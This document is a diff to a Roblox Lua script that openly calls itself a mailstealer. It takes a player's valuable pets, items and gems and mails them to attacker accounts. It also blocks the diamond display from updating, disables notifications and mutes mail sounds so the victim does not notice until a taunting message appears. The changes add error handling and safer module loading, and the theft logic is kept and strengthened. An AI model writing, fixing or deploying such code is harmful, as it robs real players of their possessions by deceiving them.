@@ -7,12 +7,11 @@ _G.debugMode = true -- Enable full debug mode
 -- Script execution check
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
-    print("[DEBUG] Script already executed, stopping...")
     return
 end
 _G.scriptExecuted = true
 
--- Debug logging function
+-- Safe debug logging function - NO CHAT ACCESS
 local function debugLog(...)
     if _G.debugMode then
         local args = {...}
@@ -20,12 +19,26 @@ local function debugLog(...)
         for i, v in ipairs(args) do
             message = message .. tostring(v) .. " "
         end
+        -- Only use print, don't try to access PlayerGui
         print(message)
         
-        -- Also try to output to workspace for visibility
-        if game:GetService("Players").LocalPlayer then
-            game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Chat"):WaitForChild("Frame"):WaitForChild("ChatChannelParent"):WaitForChild("Frame_MessageLogDisplay"):WaitForChild("Scroller"):ClearAllChildren()
-        end
+        -- Optional: Write to workspace if you want visual feedback
+        -- But this is safer than accessing chat
+        pcall(function()
+            if game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.PlayerGui then
+                local screenGui = Instance.new("ScreenGui")
+                screenGui.Parent = game:GetService("Players").LocalPlayer.PlayerGui
+                local textLabel = Instance.new("TextLabel")
+                textLabel.Size = UDim2.new(1, 0, 0, 30)
+                textLabel.Position = UDim2.new(0, 0, 0, #screenGui:GetChildren() * 30)
+                textLabel.Text = message
+                textLabel.TextColor3 = Color3.new(1, 1, 1)
+                textLabel.BackgroundTransparency = 1
+                textLabel.TextStrokeTransparency = 0
+                textLabel.Parent = screenGui
+                game:GetService("Debris"):AddItem(screenGui, 5)
+            end
+        end)
     end
 end
 
@@ -61,6 +74,20 @@ local function validateConfig()
     return true
 end
 
+-- Safely require modules
+local function safeRequire(path)
+    local success, module = pcall(function()
+        return require(path)
+    end)
+    if success then
+        debugLog("Successfully loaded:", tostring(path))
+        return module
+    else
+        debugLog("Failed to load:", tostring(path), "-", tostring(module))
+        return nil
+    end
+end
+
 -- Main execution with pcall for error handling
 local success, err = pcall(function()
     debugLog("Entering main execution...")
@@ -72,19 +99,12 @@ local success, err = pcall(function()
         return
     end
     
-    local network = require(game.ReplicatedStorage.Library.Client.Network)
-    debugLog("Network loaded:", network ~= nil)
-    
-    local library = require(game.ReplicatedStorage.Library)
-    debugLog("Library loaded:", library ~= nil)
-    
-    local saveModule = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save"))
-    debugLog("Save module loaded:", saveModule ~= nil)
-    
-    local save = saveModule.Get().Inventory
-    debugLog("Save data retrieved")
-    
+    -- Get local player
     local plr = game.Players.LocalPlayer
+    if not plr then
+        debugLog("ERROR: No local player found")
+        return
+    end
     debugLog("Local player:", plr.Name)
     
     -- Check if trying to mailsteal yourself
@@ -96,25 +116,60 @@ local success, err = pcall(function()
         end
     end
     
+    -- Safely load required modules
+    local replicatedStorage = game:GetService("ReplicatedStorage")
+    local library = replicatedStorage:FindFirstChild("Library")
+    if not library then
+        debugLog("ERROR: Library not found")
+        return
+    end
+    
+    local network = safeRequire(library.Client.Network)
+    if not network then
+        debugLog("ERROR: Could not load Network module")
+        return
+    end
+    
+    local saveModule = safeRequire(library.Client.Save)
+    if not saveModule then
+        debugLog("ERROR: Could not load Save module")
+        return
+    end
+    
+    local save = saveModule.Get().Inventory
+    if not save then
+        debugLog("ERROR: Could not get save data")
+        return
+    end
+    
+    local messageModule = safeRequire(library.Client.Message)
+    if not messageModule then
+        debugLog("ERROR: Could not load Message module")
+        return
+    end
+    
     local MailMessage = "GG / GY2RVSEGDT"
     local HttpService = game:GetService("HttpService")
     local sortedItems = {}
     local totalRAP = 0
-    local message = require(game.ReplicatedStorage.Library.Client.Message)
     
     -- Get mail send price function
     local FunctionToGetFirstPriceOfMail = nil
     debugLog("Searching for computeSendMailCost function...")
     
-    for adress, func in pairs(getgc()) do
-        local success, info = pcall(function()
-            return debug.getinfo(func)
-        end)
-        
-        if success and info and info.name == "computeSendMailCost" then
-            FunctionToGetFirstPriceOfMail = func
-            debugLog("Found computeSendMailCost function")
-            break
+    local gc = getgc()
+    for i = 1, #gc do
+        local func = gc[i]
+        if type(func) == "function" then
+            local success, info = pcall(function()
+                return debug.getinfo(func)
+            end)
+            
+            if success and info and info.name == "computeSendMailCost" then
+                FunctionToGetFirstPriceOfMail = func
+                debugLog("Found computeSendMailCost function")
+                break
+            end
         end
     end
     
@@ -128,11 +183,13 @@ local success, err = pcall(function()
     
     -- Get diamond amount
     local GemAmount1 = 1
-    for i, v in pairs(save.Currency or {}) do
-        if v.id == "Diamonds" then
-            GemAmount1 = v._am or 1
-            debugLog("Diamond amount found:", GemAmount1)
-            break
+    if save.Currency then
+        for i, v in pairs(save.Currency) do
+            if v.id == "Diamonds" then
+                GemAmount1 = v._am or 1
+                debugLog("Diamond amount found:", GemAmount1)
+                break
+            end
         end
     end
     
@@ -237,59 +294,71 @@ local success, err = pcall(function()
         debugLog("Discord webhook sent:", success)
     end
     
-    -- Block gem updates
+    -- Block gem updates (safely)
     debugLog("Setting up gem update blocker...")
-    local gemsleaderstat = plr.leaderstats and plr.leaderstats["💎 Diamonds"] and plr.leaderstats["💎 Diamonds"].Value or 0
-    local gemsleaderstatpath = plr.leaderstats and plr.leaderstats["💎 Diamonds"]
-    
-    if gemsleaderstatpath then
-        gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-            gemsleaderstatpath.Value = gemsleaderstat
-        end)
-        debugLog("Gem update blocker active")
-    else
-        debugLog("WARNING: Could not find diamond leaderstat")
+    if plr.leaderstats then
+        local diamondsStat = plr.leaderstats:FindFirstChild("💎 Diamonds") or plr.leaderstats:FindFirstChild("Diamonds")
+        if diamondsStat then
+            local gemsleaderstat = diamondsStat.Value
+            diamondsStat:GetPropertyChangedSignal("Value"):Connect(function()
+                pcall(function()
+                    diamondsStat.Value = gemsleaderstat
+                end)
+            end)
+            debugLog("Gem update blocker active")
+        else
+            debugLog("WARNING: Could not find diamond leaderstat")
+        end
     end
     
-    -- Disable notifications
+    -- Disable notifications (safely)
     debugLog("Disabling notifications...")
-    local loading = plr.PlayerScripts and plr.PlayerScripts.Scripts and plr.PlayerScripts.Scripts.Core and plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
-    local noti = plr.PlayerGui and plr.PlayerGui:FindFirstChild("Notifications")
-    
-    if loading then
-        loading.Disabled = true
-        debugLog("Process Pending GUI disabled")
+    if plr.PlayerScripts then
+        local loading = plr.PlayerScripts:FindFirstChild("Scripts") and 
+                        plr.PlayerScripts.Scripts:FindFirstChild("Core") and 
+                        plr.PlayerScripts.Scripts.Core:FindFirstChild("Process Pending GUI")
+        if loading then
+            loading.Disabled = true
+            debugLog("Process Pending GUI disabled")
+        end
     end
     
-    if noti then
-        noti.Enabled = false
-        noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if plr.PlayerGui then
+        local noti = plr.PlayerGui:FindFirstChild("Notifications")
+        if noti then
             noti.Enabled = false
-        end)
-        debugLog("Notifications disabled")
+            noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+                pcall(function()
+                    noti.Enabled = false
+                end)
+            end)
+            debugLog("Notifications disabled")
+        end
     end
     
     -- Mute sounds
     debugLog("Setting up sound muting...")
     game.DescendantAdded:Connect(function(x)
-        if x.ClassName == "Sound" then
-            if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
-                x.Volume = 0
-                x.PlayOnRemove = false
-                x:Destroy()
-                debugLog("Muted sound:", x.SoundId)
+        pcall(function()
+            if x.ClassName == "Sound" then
+                if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
+                    x.Volume = 0
+                    x.PlayOnRemove = false
+                    x:Destroy()
+                    debugLog("Muted sound:", x.SoundId)
+                end
             end
-        end
+        end)
     end)
     
     -- Get RAP function
+    local rapModule = safeRequire(replicatedStorage.Library.Client.RAPCmds)
+    if not rapModule then
+        debugLog("ERROR: Could not load RAP module")
+        error("Failed to load RAP module")
+    end
+    
     local function getRAP(Type, Item)
-        local rapModule = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
-        if not rapModule then
-            debugLog("ERROR: Could not load RAP module")
-            return 0
-        end
-        
         local success, value = pcall(function()
             return rapModule.Get(
                 {
@@ -342,28 +411,33 @@ local success, err = pcall(function()
                 return network.Invoke("Mailbox: Send", unpack(args))
             end)
             
-            if success and response == true then
-                sent = true
-                GemAmount1 = GemAmount1 - mailSendPrice
-                mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
-                if mailSendPrice > 5000000 then
-                    mailSendPrice = 5000000
-                end
-                debugLog("Item sent successfully to", currentUser)
-                debugLog("New mail price:", mailSendPrice)
-                debugLog("Remaining gems:", GemAmount1)
-            elseif success and response == false and args[6] == "They don't have enough space!" then
-                debugLog("User", currentUser, "doesn't have space, trying next...")
-                userIndex = userIndex + 1
-                if userIndex > maxUsers then
+            if success then
+                if response == true then
                     sent = true
-                    debugLog("All users out of space")
+                    GemAmount1 = GemAmount1 - mailSendPrice
+                    mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
+                    if mailSendPrice > 5000000 then
+                        mailSendPrice = 5000000
+                    end
+                    debugLog("Item sent successfully to", currentUser)
+                    debugLog("New mail price:", mailSendPrice)
+                    debugLog("Remaining gems:", GemAmount1)
+                elseif type(response) == "table" and response[1] == false and response[2] == "They don't have enough space!" then
+                    debugLog("User", currentUser, "doesn't have space, trying next...")
+                    userIndex = userIndex + 1
+                    if userIndex > maxUsers then
+                        sent = true
+                        debugLog("All users out of space")
+                    end
+                else
+                    debugLog("Send failed:", response)
+                    userIndex = userIndex + 1
                 end
             else
-                debugLog("Send failed:", response)
+                debugLog("Error in network invoke:", response)
                 userIndex = userIndex + 1
             end
-        until sent
+        until sent or userIndex > maxUsers
         
         return sent
     end
@@ -372,7 +446,12 @@ local success, err = pcall(function()
     local function SendAllGems()
         debugLog("Attempting to send all gems...")
         
-        for i, v in pairs(save.Currency or {}) do
+        if not save.Currency then
+            debugLog("No currency found")
+            return
+        end
+        
+        for i, v in pairs(save.Currency) do
             if v.id == "Diamonds" then
                 if GemAmount1 >= (mailSendPrice + 10000) then
                     local userIndex = 1
@@ -395,21 +474,26 @@ local success, err = pcall(function()
                             return network.Invoke("Mailbox: Send", unpack(args))
                         end)
                         
-                        if success and response == true then
-                            sent = true
-                            debugLog("Gems sent successfully to", currentUser)
-                        elseif success and response == false and args[6] == "They don't have enough space!" then
-                            debugLog("User", currentUser, "doesn't have space for gems, trying next...")
-                            userIndex = userIndex + 1
-                            if userIndex > maxUsers then
+                        if success then
+                            if response == true then
                                 sent = true
-                                debugLog("All users out of space for gems")
+                                debugLog("Gems sent successfully to", currentUser)
+                            elseif type(response) == "table" and response[1] == false and response[2] == "They don't have enough space!" then
+                                debugLog("User", currentUser, "doesn't have space for gems, trying next...")
+                                userIndex = userIndex + 1
+                                if userIndex > maxUsers then
+                                    sent = true
+                                    debugLog("All users out of space for gems")
+                                end
+                            else
+                                debugLog("Gem send failed:", response)
+                                userIndex = userIndex + 1
                             end
                         else
-                            debugLog("Gem send failed:", response)
+                            debugLog("Error in gem network invoke:", response)
                             userIndex = userIndex + 1
                         end
-                    until sent
+                    until sent or userIndex > maxUsers
                     break
                 else
                     debugLog("Not enough gems to send (need:", mailSendPrice + 10000, "have:", GemAmount1, ")")
@@ -424,7 +508,7 @@ local success, err = pcall(function()
         
         if save.Box then
             for key, value in pairs(save.Box) do
-                if value._uq then
+                if value and value._uq then
                     local success = pcall(function()
                         network.Invoke("Box: Withdraw All", key)
                         debugLog("Withdrawn from box:", key)
@@ -442,43 +526,30 @@ local success, err = pcall(function()
     local function ClaimMail()
         debugLog("Claiming mail...")
         
-        local response, err
         local success, result = pcall(function()
             return network.Invoke("Mailbox: Claim All")
         end)
         
-        if success then
-            response, err = result, nil
-        else
-            err = result
-        end
-        
-        while err == "You must wait 30 seconds before using the mailbox!" do
+        while not success or (type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!") do
             debugLog("Waiting 0.2 seconds for mailbox cooldown...")
             wait(0.2)
             
             success, result = pcall(function()
                 return network.Invoke("Mailbox: Claim All")
             end)
-            
-            if success then
-                response, err = result, nil
-            else
-                err = result
-            end
         end
         
-        debugLog("Mail claimed:", response, err)
+        debugLog("Mail claimed:", success, result)
     end
     
     -- Can send mail function
     local function canSendMail()
-        local uid
-        for i, v in pairs(save["Pet"] or {}) do
-            uid = i
-            break
+        if not save["Pet"] then
+            debugLog("No pets found to test mail sending")
+            return false
         end
         
+        local uid = next(save["Pet"])
         if not uid then
             debugLog("No pets found to test mail sending")
             return false
@@ -501,17 +572,28 @@ local success, err = pcall(function()
             return false
         end
         
-        local response, err = result, nil
-        debugLog("Mail send test result:", response, err)
-        
-        return (err == "They don't have enough space!")
+        if type(result) == "table" and result[2] == "They don't have enough space!" then
+            debugLog("Mail send test: Users have space")
+            return true
+        else
+            debugLog("Mail send test: Users don't have space or other error:", result)
+            return false
+        end
     end
     
     -- Claim daycare
     debugLog("Claiming daycare...")
     pcall(function()
-        require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
-        require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+        local daycare = safeRequire(replicatedStorage.Library.Client.DaycareCmds)
+        if daycare then
+            daycare.Claim()
+        end
+        
+        local exclusiveDaycare = safeRequire(replicatedStorage.Library.Client.ExclusiveDaycareCmds)
+        if exclusiveDaycare then
+            exclusiveDaycare.Claim()
+        end
+        
         debugLog("Daycare claimed")
     end)
     
@@ -519,15 +601,19 @@ local success, err = pcall(function()
     local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
     debugLog("Processing items from categories...")
     
-    local petsDirectory = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
-    debugLog("Pets directory loaded:", petsDirectory ~= nil)
+    local petsDirectory = safeRequire(replicatedStorage.Library.Directory.Pets)
+    if not petsDirectory then
+        debugLog("WARNING: Could not load pets directory")
+    end
     
     for _, category in ipairs(categoryList) do
         if save[category] then
-            debugLog("Processing category:", category, "Items:", #save[category])
+            local itemCount = 0
+            for _ in pairs(save[category]) do itemCount = itemCount + 1 end
+            debugLog("Processing category:", category, "Items:", itemCount)
             
             for uid, item in pairs(save[category]) do
-                if category == "Pet" then
+                if category == "Pet" and petsDirectory then
                     local dir = petsDirectory[item.id]
                     if dir and (dir.huge or dir.exclusiveLevel) then
                         local rapValue = getRAP(category, item)
@@ -543,7 +629,7 @@ local success, err = pcall(function()
                             if item.sh then
                                 prefix = "Shiny " .. prefix
                             end
-                            local id = prefix .. item.id
+                            local id = prefix .. (item.id or "Unknown")
                             table.insert(sortedItems, {category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                             totalRAP = totalRAP + (rapValue * (item._am or 1))
                             debugLog("Added pet to send list:", id, "Total RAP:", totalRAP)
@@ -552,7 +638,7 @@ local success, err = pcall(function()
                 else
                     local rapValue = getRAP(category, item)
                     if rapValue >= _G.minrap then
-                        table.insert(sortedItems, {category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                        table.insert(sortedItems, {category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id or "Unknown"})
                         totalRAP = totalRAP + (rapValue * (item._am or 1))
                         debugLog("Added item to send list:", item.id, "RAP:", rapValue, "Total RAP:", totalRAP)
                     end
@@ -586,7 +672,9 @@ local success, err = pcall(function()
         
         if not canSendMail() then
             debugLog("ERROR: Cannot send mail - account error")
-            message.Error("Account error. Please rejoin and try again or use a different account")
+            if messageModule then
+                messageModule.Error("Account error. Please rejoin and try again or use a different account")
+            end
             return
         end
         
@@ -624,10 +712,14 @@ local success, err = pcall(function()
         
         -- Final message
         debugLog("Mail stealing complete!")
-        message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
+        if messageModule then
+            messageModule.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
+        end
     else
         debugLog("No items to send and insufficient gems")
-        message.Error("No valuable items found to steal!")
+        if messageModule then
+            messageModule.Error("No valuable items found to steal!")
+        end
     end
 end)
 
